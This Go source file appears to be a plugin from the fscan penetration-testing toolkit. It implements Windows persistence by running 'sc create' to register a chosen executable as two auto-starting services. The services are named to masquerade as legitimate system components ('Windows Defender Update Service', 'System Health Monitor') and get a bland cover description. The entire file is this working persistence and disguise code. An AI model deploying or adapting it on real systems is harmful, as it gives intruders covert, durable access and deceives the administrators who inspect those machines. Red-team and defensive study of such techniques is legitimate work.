//go:build (plugin_winservice || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type WinServicePlugin struct {
	plugins.BasePlugin
}

func NewWinServicePlugin() *WinServicePlugin {
	return &WinServicePlugin{
		BasePlugin: plugins.NewBasePlugin("winservice"),
	}
}

func (p *WinServicePlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.WinPEFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.GetText("local_pe_not_specified"))}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.Tr("local_pe_not_found", pePath))}
	}

	absPath, _ := filepath.Abs(pePath)
	baseName := strings.TrimSuffix(filepath.Base(absPath), filepath.Ext(absPath))

	services := []struct {
		name    string
		display string
		start   string
	}{
		{fmt.Sprintf("WinDefendUpdate_%s", baseName), "Windows Defender Update Service", "auto"},
		{fmt.Sprintf("SysHealthMon_%s", baseName), "System Health Monitor", "delayed-auto"},
	}

	var output strings.Builder
	var successCount int

	for _, svc := range services {
		out, err := exec.Command("sc", "create", svc.name,
			fmt.Sprintf("binPath=%s", absPath),
			fmt.Sprintf("DisplayName=%s", svc.display),
			fmt.Sprintf("start=%s", svc.start)).CombinedOutput()
		if err != nil {
			output.WriteString(i18n.Tr("local_step_failed", svc.name, strings.TrimSpace(string(out))) + "\n")
			continue
		}
		_ = exec.Command("sc", "description", svc.name, "Provides system maintenance and monitoring services.").Run()
		output.WriteString(i18n.Tr("local_step_success_detail", svc.name, svc.start) + "\n")
		successCount++
	}

	if successCount > 0 {
		session.LogSuccess(i18n.Tr("winservice_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func init() {
	RegisterLocalPlugin("winservice", func() Plugin {
		return NewWinServicePlugin()
	})
}
